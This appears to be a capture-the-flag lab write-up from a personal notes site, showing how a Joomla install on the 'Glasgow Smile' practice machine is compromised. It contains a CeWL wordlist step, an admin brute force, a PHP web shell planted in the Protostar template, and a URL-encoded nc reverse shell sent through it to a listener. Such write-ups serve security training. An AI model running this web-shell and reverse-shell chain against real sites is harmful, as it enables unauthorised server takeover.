---
layout: default
title: Joomla
parent: Web Exploits
nav_order: 8
---

# Joomla

---

## Brute force the Joomla admin login

Use Cewl to generate custom wordlist.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ cewl http://192.168.202.79/joomla/ -w joker.txt
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

```

Using the username _joomla_ we brute force in with the password _Gotham_

![password](../../../../assets/images/ctfs/proving_grounds/glasgowsmile/password.png)

![logon](../../../../assets/images/ctfs/proving_grounds/glasgowsmile/logon.png)

## Exploit Protostar Template for Reverse Shell

Select Templates > Templates > ProtoStar

![protostar](../../../../assets/images/ctfs/proving_grounds/glasgowsmile/protostar.png)

Create new file.

![new](../../../../assets/images/ctfs/proving_grounds/glasgowsmile/new.png)

![file](../../../../assets/images/ctfs/proving_grounds/glasgowsmile/file.png)

Use the following PHP web shell one-liner.

```bash
<?= system($_GET['cmd']); ?>
```

![cmd](../../../../assets/images/ctfs/proving_grounds/glasgowsmile/cmd.png)

![id](../../../../assets/images/ctfs/proving_grounds/glasgowsmile/id.png)

Generate the revshell and urlencode

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Run the following payload in the URL

```bash
http://192.168.202.79/joomla/templates/protostar/cmd.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

We get a reverse shell

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/glasgowsmile]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.202.79] 37924
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
